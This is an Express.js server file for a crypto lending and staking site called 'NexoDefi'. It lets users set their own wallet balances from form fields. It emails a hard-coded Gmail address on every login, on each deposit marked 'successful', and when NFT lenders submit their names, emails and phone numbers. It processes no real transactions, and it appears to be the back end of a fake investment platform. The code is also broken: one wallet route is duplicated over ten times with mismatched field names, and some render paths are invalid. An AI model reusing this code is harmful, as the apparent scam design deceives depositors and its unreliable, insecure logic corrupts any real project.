require('dotenv').config();
const express=require("express");
const bodyParser=require("body-parser");
const https=require("https");
const nodemailer=require("nodemailer");
var path= require('path');
const fetch = require('node-fetch');
var mongoose = require("mongoose");
var passport = require("passport");
var LocalStrategy = require("passport-local");
var passportLocalMongoose = require("passport-local-mongoose");
const User = require("./models/user");


const app=express();

const url = process.env.MONGO_URL;

mongoose.connect(url, { useNewUrlParser: true })
.then( () => {
  console.log('Connected to the database ')
})
.catch( (err) => {
  console.error(`Error connecting to the database. n${err}`);
})


app.use(express.static(path.join(__dirname, "/public")));
app.set("view engine", "ejs");
app.use(bodyParser.urlencoded({extended:true}));
app.use(require("express-session")({
  secret: process.env.SESSION_SECRET,
  resave: false,
  saveUninitialized: false
}));
app.use(passport.initialize());
app.use(passport.session());
passport.use(new LocalStrategy(User.authenticate()));
passport.serializeUser(User.serializeUser());
passport.deserializeUser(User.deserializeUser());
passport.use(new LocalStrategy(User.authenticate()));

// var db=mongoose.connection;
// 	useUnifiedTopology: true,
// 	useCreateIndex: true

//=====================
// ROUTES
//=====================
// Showing home page
app.get("/", function (req, res) {
  res.render('Nexoo')
});

// Showing secret page
app.get("/secret", isLoggedIn, (req, res) => {
  res.render('secret',{'user' : req.user
}
  );
});

// Showing register form
app.get("/register", function (req, res) {
  res.render('register');

});
// Handling user signup
app.post("/register", (req, res) => {
  var password = req.body.password;
  User.register(new User({
    username : req.body.username,
     email : req.body.email,
     walletbal : req.body.walletbal,
     stake: 0,
     walletbtc: 0,
     walleteth: 0,
     walletbnb: 0,
     walletdot: 0,
     walletalgo: 0,
     walletftm: 0,
     walletshib: 0,
     walletsol: 0,
     wallettet: 0,
     wallettrx: 0,
     walletusd: 0,
     walletdai: 0,
     walletada: 0,
     stakebtc:0,
     stakeeth:0,
     stakeada:0,
     stakealgo:0,
     stakebnb:0,
     stakeftm:0,
     stakedot:0,
     stakedai:0,
     stakeshib:0,
     stakesol:0,
     staketet:0,
     staketrx:0,
     stakeusd:0,
   }),password, function(err,user){
    if (err){
      console.log (err);
      res.render("register");
    }
    passport.authenticate("local") (req, res, function(){
      res.redirect("/secret")
    });
  });
});

app.post("/secret", isLoggedIn, (req, res) => {
   var _id = req.user.id;
User.findByIdAndUpdate({_id},{"walletbal": req.body.btc},{new:true},
  function(err,result){
    if (err){
        console.log(err)
    }else{
      res.render("secret")
    }
  });
})


app.get("/login", function (req, res) {
  res.render('login')
});
app.post("/login",passport.authenticate("local", {
  successRedirect: "/secret",
  failureRedirect: "/login"
}),function(req,res){

});
let transporter = nodemailer.createTransport({
  host: 'smtp.gmail.com',
  port: 465,
 secure: true,
  auth: {

    user: process.env.USER_NAME,
    pass: process.env.USER_PASS,

  }
});

app.get("/logout",(req, res) => {
  req.logout();
  res.redirect("/");
});
function isLoggedIn(req, res,next) {
  if (req.isAuthenticated()){
    //
    console.log(req.user.username)
    let mailOptions = {
      from: 'tonytatum@gmail.com',
      to: 'tonytatum6@gmail.com',
      subject: 'NexoDefi',
      text: 'User '+ req.user.username +' just logged in'
    };

    transporter.sendMail(mailOptions, function(err, data) {
      if (err) {
        console.log("Error " + err);
      } else {
        console.log("Email sent successfully");
      }
    });
 return next();
  }
  res.redirect("/login");
};

app.get("/borrow", isLoggedIn, (req, res) => {
  res.render("borrow")
});


app.get("/about-us", function (req, res) {
  res.render('about-us')
});

app.get("/donate", function (req, res) {
  res.render('donate')
});
// wallets
app.get("/walletbtc", isLoggedIn, (req, res) => {

  res.render('walletbtc')
});
app.post("/walletbtc", isLoggedIn, (req, res) => {
   var _id = req.user.id;
   console.log(req.body.bitc +" "+ req.user.walletbitc)
User.findByIdAndUpdate({_id},{"walletbitc": req.body.bitc},{new:true},
  function(err,result){
    if (err){
        console.log(err)
    }else{
      res.render("/success")
    }
  });
})
app.get("/walleteth", isLoggedIn, (req, res) => {
  res.render('walleteth')
});
app.post("/walleteth", isLoggedIn, (req, res) => {
   var _id = req.user.id;
   console.log(req.body.bitc +" "+ req.user.walleteth)
User.findByIdAndUpdate({_id},{"walleteth": req.body.eth},{new:true},
  function(err,result){
    if (err){
        console.log(err)
    }else{
      console.log("complete")
    }
    res.render("/success")
  });
})
app.get("/walletltc", isLoggedIn, (req, res) => {
  res.render('walletltc')
});
app.post("/walletbtc", isLoggedIn, (req, res) => {
   var _id = req.user.id;
   console.log(req.body.bitc +" "+ req.user.walletbitc)
User.findByIdAndUpdate({_id},{"walletbitc": req.body.bitc},{new:true},
  function(err,result){
    if (err){
        console.log(err)
    }else{
      res.render("/success")
    }
  });
})
app.post("/walletbtc", isLoggedIn, (req, res) => {
   var _id = req.user.id;
   console.log(req.body.bitc +" "+ req.user.walletbitc)
User.findByIdAndUpdate({_id},{"walletbitc": req.body.bitc},{new:true},
  function(err,result){
    if (err){
        console.log(err)
    }else{
      res.render("/success")
    }
  });
})
app.get("/walletbnb", isLoggedIn, (req, res) => {
  res.render('walletbnb')
});
app.post("/walletbtc", isLoggedIn, (req, res) => {
   var _id = req.user.id;
   console.log(req.body.bitc +" "+ req.user.walletbitc)
User.findByIdAndUpdate({_id},{"walletbitc": req.body.bitc},{new:true},
  function(err,result){
    if (err){
        console.log(err)
    }else{
      res.render("/success")
    }
  });
})
app.get("/walletalgo", isLoggedIn, (req, res) => {
  res.render('walletalgo')
});
app.post("/walletbtc", isLoggedIn, (req, res) => {
   var _id = req.user.id;
   console.log(req.body.bitc +" "+ req.user.walletbitc)
User.findByIdAndUpdate({_id},{"walletbitc": req.body.bitc},{new:true},
  function(err,result){
    if (err){
        console.log(err)
    }else{
      res.render("/success")
    }
  });
})
app.get("/walletsol", isLoggedIn, (req, res) => {
  res.render('walletsol')
});
app.post("/walletbtc", isLoggedIn, (req, res) => {
   var _id = req.user.id;
   console.log(req.body.bitc +" "+ req.user.walletbitc)
User.findByIdAndUpdate({_id},{"walletbitc": req.body.bitc},{new:true},
  function(err,result){
    if (err){
        console.log(err)
    }else{
      res.render("/success")
    }
  });
})
app.get("/wallettet", isLoggedIn, (req, res) => {
  res.render('wallettet')
});
app.post("/walletbtc", isLoggedIn, (req, res) => {
   var _id = req.user.id;
   console.log(req.body.bitc +" "+ req.user.walletbitc)
User.findByIdAndUpdate({_id},{"walletbitc": req.body.bitc},{new:true},
  function(err,result){
    if (err){
        console.log(err)
    }else{
      res.render("/success")
    }
  });
})
app.get("/wallettrx", isLoggedIn, (req, res) => {
  res.render('wallettrx')
});
app.post("/walletbtc", isLoggedIn, (req, res) => {
   var _id = req.user.id;
   console.log(req.body.bitc +" "+ req.user.walletbitc)
User.findByIdAndUpdate({_id},{"walletbitc": req.body.bitc},{new:true},
  function(err,result){
    if (err){
        console.log(err)
    }else{
      res.render("/success")
    }
  });
})
app.get("/walletftm", isLoggedIn, (req, res) => {
  res.render('walletftm')
});
app.post("/walletbtc", isLoggedIn, (req, res) => {
   var _id = req.user.id;
   console.log(req.body.bitc +" "+ req.user.walletbitc)
User.findByIdAndUpdate({_id},{"walletbitc": req.body.bitc},{new:true},
  function(err,result){
    if (err){
        console.log(err)
    }else{
      res.render("/success")
    }
  });
})
app.get("/walletshib", isLoggedIn, (req, res) => {
  res.render('walletshib')
});
app.post("/walletbtc", isLoggedIn, (req, res) => {
   var _id = req.user.id;
   console.log(req.body.bitc +" "+ req.user.walletbitc)
User.findByIdAndUpdate({_id},{"walletbitc": req.body.bitc},{new:true},
  function(err,result){
    if (err){
        console.log(err)
    }else{
      res.render("/success")
    }
  });
})
app.get("/walletada", isLoggedIn, (req, res) => {
  res.render('walletada')
});
app.post("/walletbtc", isLoggedIn, (req, res) => {
   var _id = req.user.id;
   console.log(req.body.bitc +" "+ req.user.walletbitc)
User.findByIdAndUpdate({_id},{"walletbitc": req.body.bitc},{new:true},
  function(err,result){
    if (err){
        console.log(err)
    }else{
      res.render("/success")
    }
  });
})
app.get("/walletusd", isLoggedIn, (req, res) => {
  res.render('walletusd')
});
app.post("/walletbtc", isLoggedIn, (req, res) => {
   var _id = req.user.id;
   console.log(req.body.bitc +" "+ req.user.walletbitc)
User.findByIdAndUpdate({_id},{"walletbitc": req.body.bitc},{new:true},
  function(err,result){
    if (err){
        console.log(err)
    }else{
      res.render("/success")
    }
  });
})
app.get("/walletdai", isLoggedIn, (req, res) => {
  res.render('walletdai')
});
app.post("/walletbtc", isLoggedIn, (req, res) => {
   var _id = req.user.id;
   console.log(req.body.bitc +" "+ req.user.walletbitc)
User.findByIdAndUpdate({_id},{"walletbitc": req.body.bitc},{new:true},
  function(err,result){
    if (err){
        console.log(err)
    }else{
      res.render("/success")
    }
  });
})
app.get("/walletdot", isLoggedIn, (req, res) => {
  res.render('walletdot')
});
app.post("/walletbtc", isLoggedIn, (req, res) => {
   var _id = req.user.id;
   console.log(req.body.bitc +" "+ req.user.walletbitc)
User.findByIdAndUpdate({_id},{"walletbitc": req.body.bitc},{new:true},
  function(err,result){
    if (err){
        console.log(err)
    }else{
      res.render("/success")
    }
  });
})
app.post("/stakes", isLoggedIn, (req, res) => {
  var wallets = req.body.ftm;
  console.log(wallets);
  res.render("wallet" + wallets)
});
app.get("/stakes", isLoggedIn, (req, res) => {
  res.render('stakes',{'user' : req.user
})
});
// Showing home page
app.get("/nft-lend", isLoggedIn, (req, res) => {
  res.render('nft-lend')
});
app.get("/walletnft", isLoggedIn, (req, res) => {
  res.render('walletnft')
});
app.post("/nft-lend", function (req, res) {
  var fName = req.body.firstName;
  var lName = req.body.lastName;
  var eMail = req.body.email;
  var phone = req.body.phone;
  var nftCollection = req.body.nftcollection;
  var identity = req.body.nftId;
  var messageNft = req.body.messageNft;
  var fullName= fName + " "+ lName;

  let mailOptions = {
    from: 'tonytatum@gmail.com',
    to: 'tonytatum6@gmail.com',
    subject: 'NFT Lender',
    text: 'User ' + fullName + " with contact details Email: "+eMail+ " and Phone Number: "+phone+ " wants to sell NFT with ID: "+identity+ " in the Collection: "+nftCollection+" has this message to add. "+messageNft
  };

  transporter.sendMail(mailOptions, function(err, data) {
    if (err) {
      console.log("Error " + err);
    } else {
      console.log("Email sent successfully");
    }
  });
  res.redirect('/walletnft')
});
// Showing home page
app.get("/wallets", function (req, res) {
  res.render('wallets')
});
app.post("/success",isLoggedIn, function (req, res) {
  let mailOptions = {
    from: 'tonytatum@gmail.com',
    to: 'tonytatum6@gmail.com',
    subject: 'Deposit',
    text: 'A recently Logged in User Just marked A deposit as Successfully'
  };

  transporter.sendMail(mailOptions, function(err, data) {
    if (err) {
      console.log("Error " + err);
    } else {
      console.log("Deposited");
    }
  });
  res.render('success')
});
app.post("/stakesuccess",isLoggedIn, function (req, res) {
console.log(req.body)
let mailOptions = {
  from: 'tonytatum@gmail.com',
  to: 'tonytatum6@gmail.com',
  subject: 'Staked',
  text: req.user.username +' just Staked ' +req.body.custId + " "+ req.body.amount
};

transporter.sendMail(mailOptions, function(err, data) {
  if (err) {
    console.log("Error " + err);
  } else {
    console.log("Deposited");
  }
});
})
//
var port = process.env.PORT || 3000;
app.listen(port,function(){
  console.log("server started ");
})
